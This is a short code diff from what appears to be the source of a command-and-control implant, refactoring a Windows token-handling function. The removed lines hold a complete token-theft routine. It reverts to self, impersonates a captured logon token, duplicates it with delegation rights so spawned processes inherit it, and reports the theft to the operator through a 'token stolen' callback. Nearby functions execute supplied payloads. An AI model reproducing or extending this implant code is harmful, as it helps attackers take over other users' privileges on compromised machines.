@@ -30,28 +30,9 @@ void __stdcall posterrord(int error, int msg) {
 }
 
 BOOL __stdcall use_tokenzz(HANDLE token, char * name, DWORD nlen) {
-	/* at this point, let's drop our old token (assuming we have one) */
-	command_rev2self();
-
-	/* try to steal the token (and this *may* be good enough) */
-	if (!ImpersonateLoggedOnUser(token))
-		return FALSE;
-
-	/* try to duplicate the token into xtoken... why? So we can propagate it to child processes.
-	may need to update execute/shell to use a stored xtoken */
-	if (!DuplicateTokenEx(token, MAXIMUM_ALLOWED, NULL, SecurityDelegation, TokenPrimary, &atoken))
-		return FALSE;
-
-	/* for some reason, I need to do this a second time to make the current thread take on
-	the impersonated token. *shrug* */
-	if (!ImpersonateLoggedOnUser(atoken))
-		return FALSE;
-
-	if (!token_user(atoken, name, nlen))
-		return FALSE;
-
-	command_shell_callback(name, strlen(name), CALLBACK_TOKEN_STOLEN);
-	return TRUE;
+	/* the canonical implementation lives in tokens.cpp (use_token); this
+	 * __stdcall trampoline only exists for the BEACON_FUNCS table */
+	return use_token(token, name, nlen);
 }
 
 BOOL inline_execute(char * payload, DWORD plength, char * arg, DWORD alength) {
